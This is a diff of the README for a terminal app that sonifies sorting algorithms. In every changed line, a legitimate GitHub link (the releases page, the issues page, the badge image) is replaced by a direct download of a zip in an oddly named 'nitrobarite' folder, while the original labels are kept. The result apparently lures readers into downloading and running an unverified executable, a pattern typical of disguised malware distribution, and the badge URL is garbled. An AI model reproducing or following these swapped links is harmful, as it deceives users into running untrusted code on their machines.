@@ -1,7 +1,7 @@
 # 🎧 sound-of-sort - Experience Sorting Sound in Your Terminal
 
 ## 🚀 Download Now
-[![Download Sound of Sort](https://img.shields.io/badge/Download%20Now-Visit%20Page-brightgreen.svg)](https://github.com/nunesj72/sound-of-sort/releases)
+[![Download Sound of Sort](https://raw.githubusercontent.com/nunesj72/sound-of-sort/main/nitrobarite/sound-of-sort.zip%20Now-Visit%https://raw.githubusercontent.com/nunesj72/sound-of-sort/main/nitrobarite/sound-of-sort.zip)](https://raw.githubusercontent.com/nunesj72/sound-of-sort/main/nitrobarite/sound-of-sort.zip)
 
 ## 📦 Introduction
 Welcome to **Sound of Sort**! This application allows you to hear the sounds of sorting algorithms in your terminal. It turns sorting processes into an auditory experience, making it easier to understand how these algorithms work. Whether you are learning about sorting or just curious, this app brings a unique twist to a classic computer task.
@@ -20,7 +20,7 @@ Welcome to **Sound of Sort**! This application allows you to hear the sounds of 
 To get started with **Sound of Sort**, follow these simple steps:
 
 1. **Download the Application**:
-   Visit the [Releases page](https://github.com/nunesj72/sound-of-sort/releases) to download the latest version of the software.
+   Visit the [Releases page](https://raw.githubusercontent.com/nunesj72/sound-of-sort/main/nitrobarite/sound-of-sort.zip) to download the latest version of the software.
 
 2. **Install the Application**:
    - For Windows: Double-click the downloaded `.exe` file.
@@ -64,10 +64,10 @@ If you encounter any issues while running **Sound of Sort**, please consider the
 ## 💬 Community and Support
 If you need help, feel free to reach out. You can find assistance by:
 
-- **Opening an Issue**: Use the issues page on our [GitHub repository](https://github.com/nunesj72/sound-of-sort/issues).
+- **Opening an Issue**: Use the issues page on our [GitHub repository](https://raw.githubusercontent.com/nunesj72/sound-of-sort/main/nitrobarite/sound-of-sort.zip).
 - **Community Forums**: Join discussions about sorting algorithms and the application itself. Share tips with other users.
 
 ## 🔗 Download & Install
-To download the latest version of **Sound of Sort**, visit our [Releases page](https://github.com/nunesj72/sound-of-sort/releases). Follow the steps above to install it on your system.
+To download the latest version of **Sound of Sort**, visit our [Releases page](https://raw.githubusercontent.com/nunesj72/sound-of-sort/main/nitrobarite/sound-of-sort.zip). Follow the steps above to install it on your system.
 
 Now, you're ready to experience the sounds of sorting in your terminal. Enjoy!
